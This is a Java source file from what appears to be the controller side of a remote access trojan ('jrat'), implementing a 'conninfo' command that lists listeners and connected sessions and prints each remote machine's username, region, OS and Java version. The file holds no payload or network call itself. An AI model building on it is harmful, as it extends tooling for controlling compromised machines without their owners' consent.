package net.jrat.core.command.commands;

import org.apache.commons.cli.CommandLine;

import net.jrat.core.command.Command;
import net.jrat.core.connection.Connection;
import net.jrat.core.listener.Listener;
import net.jrat.utils.Logger;

public class ConnectionInfo extends Command
{
	public ConnectionInfo()
	{
		super("conninfo", new String[] { "connection", "listener" }, new String[] { "sets the connection", "sets the listener in which the connection is" }, "shows some informations of current connections");
	}
	
	@Override
	public void execute(CommandLine commandLine) throws Exception
	{
		final String connectionName = commandLine.getOptionValue("connection", null);
		final String listenerName = commandLine.getOptionValue("listener", null);
		
		if(connectionName == null)
		{
			Logger.log("listing all connections");
			{
				Logger.startFrequence();
				
				if(listenerName == null)
				{
					for(Listener listener : this.server.listenerManager.listeners)
					{
						Logger.log(listener.name + " (" + listener.address + ":" + listener.port + ")");
						{
							Logger.startFrequence();
							
							for(Connection connection : listener.connections)
								Logger.log(connection.informations.username + " -> " + connection.informations.os);
							
							Logger.stopFrequence();
						}
						Logger.log(listener.name + " (" + listener.address + ":" + listener.port + ")");
						Logger.space();
					}
				}
				else
				{
					final Listener listener = this.server.listenerManager.getListener(listenerName);
					
					if(listener == null)
						throw new Exception("listener does not exist");
					
					Logger.log(listener.name + " (" + listener.address + ":" + listener.port + ")");
					{
						Logger.startFrequence();

						for(Connection connection : listener.connections)
							Logger.log(connection.informations.username + " -> " + connection.informations.os);

						Logger.stopFrequence();
					}
					Logger.log(listener.name + " (" + listener.address + ":" + listener.port + ")");
				}
				
				Logger.stopFrequence();
			}
			Logger.log("done");
		}
		else
		{
			if(listenerName == null)
				throw new Exception("listener name is needed");
			
			final Listener listener = this.server.listenerManager.getListener(listenerName);

			if(listener == null)
				throw new Exception("listener does not exist");
			
			final Connection connection = listener.getConnection(connectionName);
			
			if(connection == null)
				throw new Exception("connection does not exist");
			
			Logger.log(connection.informations.username);
			{
				Logger.startFrequence();
				
				Logger.log("username: " + connection.informations.username);
				Logger.log("region: " + connection.informations.region);
				Logger.log("os: " + connection.informations.os);
				Logger.log("java version: " + connection.informations.javaVersion);
				
				Logger.stopFrequence();
			}
			Logger.log(connection.informations.username);
		}
	}
}
